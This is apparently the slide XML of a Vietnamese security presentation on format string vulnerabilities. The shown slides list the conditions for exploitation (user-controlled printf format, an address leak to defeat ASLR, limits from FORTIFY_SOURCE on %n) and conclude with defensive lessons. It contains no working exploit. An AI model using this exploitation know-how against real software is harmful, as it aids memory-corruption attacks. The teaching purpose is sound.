          <a:xfrm>
            <a:off x="548640" y="274320"/>
            <a:ext cx="10969560" cy="81972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Arial"/>
              </a:rPr>
              <a:t>Điều kiện &amp; giới hạn khai thác</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3000" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="200" name="TextBox 149"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="1234440"/>
            <a:ext cx="10969920" cy="2825640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="0">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
        <p:txBody>
          <a:bodyPr lIns="90000" tIns="45000" rIns="90000" bIns="45000" anchor="t">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Cần : user kiểm soát được format string (printf(user_input))</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1800" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="1800" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>ASLR : địa chỉ không đoán được → cần  leak được </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1800" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="1800" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>FORTIFY_SOURCE : bắt %n khi format là hằng số → chỉ hiệu quả nếu format string cố định ở compile time</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1800" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="1800" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>%n bị vô hiệu hóa trong một số môi trường (glibc _FORTIFY_SOURCE=2 disable %n)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1800" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAf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1" name="TextBox 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="274320"/>
            <a:ext cx="10969560" cy="81972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3000" b="1" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Bài học &amp; kết luận</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3000" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="202" name="TextBox 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="1234440"/>
            <a:ext cx="10969560" cy="3275280"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="0">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
        <p:txBody>
          <a:bodyPr lIns="90000" tIns="45000" rIns="90000" bIns="45000" anchor="t">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2100" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Không bao giờ truyền user input làm format string</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2100" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2100" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2100" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Luôn dùng format string literal : printf("%s", input)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2100" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2100" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2100" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Defense in depth : FORTIFY_SOURCE + ASLR </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2100" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2100" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2100" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2100" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2100" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="203" name=""/>
          <p:cNvPicPr/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId1"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="6756840" y="685800"/>
            <a:ext cx="4761360" cy="47613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571</TotalTime>
  <Application>LibreOffice/26.2.6.3$Linux_X86_64 LibreOffice_project/620$Build-3</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2026-10-28T01:24:19Z</dcterms:modified>
  <cp:revision>699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